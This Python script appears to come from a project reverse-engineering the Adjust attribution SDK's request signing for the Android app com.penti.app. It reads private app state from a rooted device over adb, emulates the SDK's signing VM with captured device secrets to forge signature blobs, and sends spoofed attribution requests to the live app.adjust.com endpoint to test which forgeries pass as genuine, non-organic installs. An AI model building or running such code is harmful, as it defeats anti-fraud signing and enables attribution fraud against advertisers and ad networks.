r"""slot_test.py — the last two candidates, tested against the live oracle.

Established (dev_ab.py, 2026-09-15): same gps + same android_uuid + same minute
  DEVICE  genuine signature -> 24pxw9rl VKM
  CRAFTED our signature     -> wy7261z Organic
so the server distinguishes our body. Eliminated: identity/auid (same), params
(22/22 identical), UA/Client-SDK (verified), IP (same egress), body-stamp tz
(stamp_test.py v2 -> still Organic).

Remaining per-signing slots our maker gets wrong by construction:
  #0 = 144 zeros           (genuine: 40 B run-stable prefix + count 0x0b + ...)
  #4 = random 32 B "H"     (genuine: HMAC-SHA256(key2, canonical))

Variants (all with the same claims/identity as the device's live install):
  A  zeros #0 + random H   (baseline, known Organic)
  B  CAPTURED #0 + random H
  C  zeros #0 + CAPTURED H
  D  CAPTURED #0 + CAPTURED H      (nearest to a genuine body)

Usage: python slot_test.py
"""
import base64
import glob
import json
import os
import re
import struct
import subprocess
import sys
import time
from collections import Counter, defaultdict

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import adj9_full_chain as fc
from fin_vm2 import FinEx
from header_gen import make_header

ADJDIR = os.path.dirname(HERE)
STATE = "/data/data/com.penti.app/files/AdjustIoActivityState"
GAID = "d016e7e4-fb1c-4d0a-b619-db01f6a6a262"
UUID_RE = rb"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"
OUT = os.path.join(HERE, "slot_test_result.json")

fc.DEV, fc.UA = dict(fc.MOTO), fc.MOTO_UA
fc.OFF_MINUTES, fc.OFF_LABEL = 330, "+0530"
AUID_OUT = [None]


def device_auid():
    r = subprocess.run(["adb", "shell",
                        '/debug_ramdisk/su -c "cat %s | base64"' % STATE],
                       capture_output=True)
    try:
        d = base64.b64decode(r.stdout)
    except Exception:
        return None
    m = re.search(UUID_RE, d)
    return m.group(0).decode() if m else None


def captured_core0():
    """A genuine 144-B core record (#0) from the device capture."""
    D = json.load(open(os.path.join(ADJDIR, "device", "core0_samples.json")))
    cnt = Counter(e["hex"] for e in D if isinstance(e, dict) and "hex" in e)
    b = bytes.fromhex(cnt.most_common(1)[0][0])
    assert len(b) == 144, len(b)
    return b


def captured_H():
    """A genuine H (nSign arg3) from the device oracle captures."""
    for f in sorted(glob.glob(os.path.join(ADJDIR, "cap", "*.log"))):
        d = open(f, encoding="utf-8", errors="replace").read()
        m = re.search(r"arg3_hex=([0-9a-f]{64})", d)
        if m:
            return bytes.fromhex(m.group(1))
    raise SystemExit("no captured H found")


def mint(second, created, gps, auid, installed, core0, H):
    by = {d["build_idx"]: (d["len_dw"], bytes.fromhex(d["data_hex"]))
          for d in fc.D["descs"]}
    by[4] = (8, H)                    # #4 = H (opaque TEE tag)
    by[0] = (36, core0)               # #0 = core record
    cre = created.replace(b"+0530", b"+0200")
    ins = installed.replace(b"+0530", b"+0200")
    d10 = by[10][1].replace(b"2026-09-12T21:15:11.678Z+0200", cre)
    d10 = fc.swap_eq(d10, b"f476b3d4-e0b1-4707-bc43-6153d17f7f8c",
                     gps.encode())
    d10 = fc.swap_eq(d10, b"d773f47f-fc0e-4994-9cf7-7c3cf5bb6368",
                     auid.encode())
    d10 = fc.rep1(d10, b"moto g42", fc.DEV["device_name"].encode())
    d10 = fc.rep1(d10, b"S2SE32.28-28-4", fc.DEV["hardware_name"].encode())
    d10 = fc.rep1(d10, b"S2SE32.28-28-4", fc.DEV["os_build"].encode())
    d10 = fc.swap_eq(d10, b"12com.penti.app",
                     (fc.DEV["os_version"] + "com.penti.app").encode())
    d10 = fc.swap_eq(d10, b"31jut9tib0eeps",
                     (fc.DEV["api_level"] + "jut9tib0eeps").encode())
    d10 = fc.swap_eq(d10, b"2026-09-08T12:20:49.782Z+0200", ins)
    d10 = fc.swap_eq(d10, b"2026-09-10T07:26:18.015Z+0200", ins)
    by[7] = (1, struct.pack(">I", len(d10)))
    by[10] = (len(d10) // 4, d10)
    ex = FinEx(second, [(by[i][0], 0, by[i][1]) for i in fc.ORDER])
    status = ex.run(max_steps=20_000_000)
    sinks = defaultdict(dict)
    for (s, n, v) in ex.emit_trace:
        sinks[s][n] = v
    blob = b"".join(struct.pack(">I", sinks[0x5500000000].get(i, 0))
                    for i in range(48))
    assert blob[:16] == make_header(second)
    return status, ex.steps, blob


def send_attr(blob, sec):
    p = {"initiated_by": "backend", "gps_adid_attempt": "1",
         "api_level": fc.DEV["api_level"], "app_version": fc.DEV["app_version"],
         "app_token": fc.APP_TOKEN, "os_version": fc.DEV["os_version"],
         "created_at": fc.fmt(sec - 1, 666).decode(), "device_type": "phone",
         "gps_adid": GAID, "foreground": "1", "android_uuid": AUID_OUT[0],
         "sent_at": fc.fmt(sec - 1, 696).decode(), "offline_mode_enabled": "0",
         "device_name": fc.DEV["device_name"], "environment": "production",
         "needs_response_details": "1", "attribution_deeplink": "1",
         "package_name": "com.penti.app", "os_name": "android",
         "ui_mode": "1", "gps_adid_src": "service", "tracking_enabled": "1"}
    return fc.send("https://app.adjust.com/attribution", p, blob,
                   method="GET")


def main():
    import secrets
    au = device_auid()
    AUID_OUT[0] = au
    c0, H = captured_core0(), captured_H()
    print("auid=%s core0_b0_7=%s core0_dw10=%d H=%s"
          % (au, c0[:8].hex(), struct.unpack("<I", c0[40:44])[0], H[:8].hex()),
          flush=True)
    variants = [("A zeros #0 + random H", bytes(144), secrets.token_bytes(32)),
                ("B CAPTURED #0 + random H", c0, secrets.token_bytes(32)),
                ("C zeros #0 + CAPTURED H", bytes(144), H),
                ("D CAPTURED #0 + CAPTURED H", c0, H)]
    res = {"auid": au, "runs": []}
    for label, core0, hh in variants:
        sec = int(time.time()) + 35
        st, steps, blob = mint(sec, fc.fmt(sec - 1, 666), GAID, au,
                               fc.fmt(sec - 170, 774), core0, hh)
        s, r = send_attr(blob, sec)
        try:
            a = json.loads(r)["attribution"]
            v = "%s / %s / eng=%s" % (a.get("tracker_token"), a.get("network"),
                                      a.get("engagement_time"))
        except Exception:
            v = "HTTP %s %s" % (s, r[:150])
        print("[%s] mint=%s -> %s %s" % (label, st, s, v), flush=True)
        res["runs"].append({"label": label, "http": s, "verdict": v,
                            "body": r[:1500]})
        time.sleep(3)
    json.dump(res, open(OUT, "w"), indent=1)
    print("saved", OUT, flush=True)


if __name__ == "__main__":
    main()